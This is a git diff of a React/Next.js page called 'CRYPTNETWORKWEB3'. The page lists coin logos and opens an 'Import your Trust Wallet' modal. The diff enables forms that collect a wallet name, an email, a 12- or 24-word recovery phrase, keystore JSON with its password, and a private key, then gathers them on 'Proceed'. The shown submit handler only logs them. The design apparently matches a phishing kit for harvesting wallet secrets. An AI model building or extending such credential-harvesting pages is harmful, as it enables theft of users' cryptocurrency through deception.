@@ -10,18 +10,38 @@ import Image from "next/image";
 
 
 export default function Page() {
+  const [show1, setShow1] = useState(false)
+  const [show2, setShow2] = useState(false)
+  const [sym, setSym] = useState({})
+  function handleClick(file){
+    setSym(file)
+    setShow1(!show1)
+    console.log(file)
+  }
+  function handleClick2(){
+    setShow1(!show1)
+    setShow2(!show2)
+  }
+  function handleClick3(){
+    setShow2(!show2)
+  }
   return (
     <div className={styles.page}>
       <Navbar/>
       <Hero/>
-      <Choose/>
-      {/* <Popup/> */}
-      {/* <Popup2/> */}
+      <Choose handleShow={handleClick}/>
+      {show1 && <Popup handleShow={handleClick} file={sym} handleShow2={handleClick2}/>}
+      {show2 && <Popup2 handleShow={handleClick2} handleShow2={handleClick3}/>}
     </div>
   )
 }
 
 export function Navbar(){
+  const [pop, setPop] = useState(false)
+  const router = useRouter();
+  function handleClick(){
+    setPop(!pop)
+  }
   return (
     <nav className={styles.nav}>
         <h1>CRYPTNETWORKWEB3</h1>
@@ -30,15 +50,16 @@ export function Navbar(){
             <li>NFT</li>
             <li>Web3</li>
         </ul>
-        {/* <main>
+        {pop && <main>
+          <span onClick={handleClick}>X</span>
           <ol>
             <li>DApps</li>
             <li>NFT</li>
             <li>Web3</li>
           </ol>
-        </main> */}
+        </main>}
         <button>Secure Wallet</button>
-        <div>
+        <div onClick={handleClick}>
           <span></span><span></span><span></span>
         </div>
     </nav>
@@ -56,7 +77,7 @@ export function Hero(){
   )
 }
 
-export function Choose(){
+export function Choose({handleShow}){
   const files = [
   { src: "/symbols/akt.png", text: "akt" },
   { src: "/symbols/alice.png", text: "alice" },
@@ -148,7 +169,7 @@ export function Choose(){
         <div className={styles.cardbox}>
           {files.map((file, i) =>{
             return(
-              <div className={styles.card} key={i}>
+              <div className={styles.card} key={i} onClick={()=> handleShow(file)}>
                 <Image
                   src={file.src}
                   alt="Coin Logo"
@@ -165,27 +186,43 @@ export function Choose(){
   )
 }
 
-export function Popup(){
+export function Popup({handleShow, file, handleShow2}){
   return (
     <section className={styles.popup}>
         <main>
-          <span>X</span>
+          <span onClick={handleShow}>X</span>
           <Image
-            src="/symbols/trust.png"
+            src={file.src}
             alt="Coin Logo"
             width={50}
             height={50}
             priority
           />
-          <h1>Trust</h1>
+          <h1>{file.text}</h1>
           <p>A Web3 wallet is a versatile and significant piece of technology that is set to revolutionize the way our online identity is presented and accessed. Wallet connect wallet can go here.</p>
-          <button>Connect</button>
+          <button onClick={handleShow2}>Connect</button>
         </main>
     </section>
   )
 }
 
-export function Popup2(){
+export function Popup2({handleShow, handleShow2}){
+  const [form, setForm] = useState([])
+  const [type, setType] = useState("phrase")
+  const handleChange = (e)=>{
+    setForm({
+      ...form,
+      [e.target.name] : e.target.value,
+    })
+  }
+
+  function handleSubmit(){
+    console.log(form)
+  }
+
+  function handleTypeChange(type){
+    setType(type)
+  }
   return (
     <section className={styles.popup2}>
       <main>
@@ -198,47 +235,47 @@ export function Popup2(){
               priority
             />
             <h1>Import your Trust Wallet </h1> 
-            <span>X</span>
+            <span onClick={handleShow2}>X</span>
         </div>
         <div className={styles.popup2subhead}>
-            <span>Phrase</span>
-            <span>Keystore JSON</span>
-            <span>Private Key</span>
+            <span onClick={() => handleTypeChange("phrase")} style={type === "phrase" ? {borderBottom: "3px solid"} : {border: "none"}}>Phrase</span>
+            <span onClick={() => handleTypeChange("key")} style={type === "key" ? {borderBottom: "3px solid"} : {border: "none"}}>Keystore JSON</span>
+            <span onClick={() => handleTypeChange("private")} style={type === "private" ? {borderBottom: "3px solid"} : {border: "none"}}>Private Key</span>
         </div>
-        {/* <section>
+        {type ==="phrase" && <section>
             <div>
                 <label htmlFor="">Wallet Name</label>
-                <input type="text" name="" id="" placeholder="Wallet Name"/>
+                <input type="text" placeholder="Wallet Name" name="Wallet Name" onChange={(e)=>handleChange(e)}/>
             </div>
             <div>
                 <label htmlFor="">Email</label>
-                <input type="email" name="" id="" placeholder="Email"/>
+                <input type="email" placeholder="Email" name="Email" onChange={(e)=>handleChange(e)}/>
             </div>
             <div>
                 <label htmlFor="">Phrase</label>
-                <textarea name="" id="" placeholder="Enter recovery phrase"></textarea>
+                <textarea placeholder="Enter recovery phrase" name="Phrase" onChange={(e)=>handleChange(e)}></textarea>
                 <p>Typically 12 (sometimes 24) words separated by single spaces</p>
             </div> 
-        </section> */}
-        <section>
+        </section>}
+        {type === "key" && <section>
             <p>Upload or paste your keystore JSON contents here.</p>
-            <input type="text" name="" id="" placeholder="Wallet Name"/>
-            <input type="text" name="" id="" placeholder="Email"/>
-            <textarea name="" id="" placeholder="KeyStore JSON"></textarea>
-            <input type="text" name="" id="" placeholder="Wallet Password"/>
+            <input type="text" placeholder="Wallet Name"  name="Wallet Name" onChange={(e)=>handleChange(e)}/>
+            <input type="email" placeholder="Email"  name="Email" onChange={(e)=>handleChange(e)}/>
+            <textarea placeholder="KeyStore JSON"  name="KeyStore JSON" onChange={(e)=>handleChange(e)}></textarea>
+            <input type="password" placeholder="Wallet Password"  name="Wallet Password" onChange={(e)=>handleChange(e)}/>
             <p>Several lines of text beginning with "(...)" plus the password you used to encrypt it.</p>
-        </section>
-        {/* <section>
+        </section>}
+        {type === "private" && <section>
             <p>Enter your private key below:</p>
-            <input type="text" name="" id="" placeholder="Wallet Name"/>
-            <input type="text" name="" id="" placeholder="Email"/>
-            <textarea name="" id="" placeholder="KeyStore JSON"></textarea>
-            <input type="text" name="" id="" placeholder="Enter your private key"/>
+            <input type="text" placeholder="Wallet Name" name="Wallet Name" onChange={(e)=>handleChange(e)}/>
+            <input type="email" placeholder="Email" name="Email" onChange={(e)=>handleChange(e)}/>
+            <textarea placeholder="KeyStore JSON" name="KeyStore JSON" onChange={(e)=>handleChange(e)}></textarea>
+            <input type="password" placeholder="Enter your private key" name="Private Key" onChange={(e)=>handleChange(e)}/>
             <p>Typically 12 (sometimes 24) words separated by a single space.</p>
-        </section> */}
+        </section>}
         <div className={styles.btns}>
-            <button>Cancel</button>
-            <button>Proceed</button>
+            <button onClick={handleShow2}>Cancel</button>
+            <button onClick={handleSubmit}>Proceed</button>
         </div>
       </main>
         
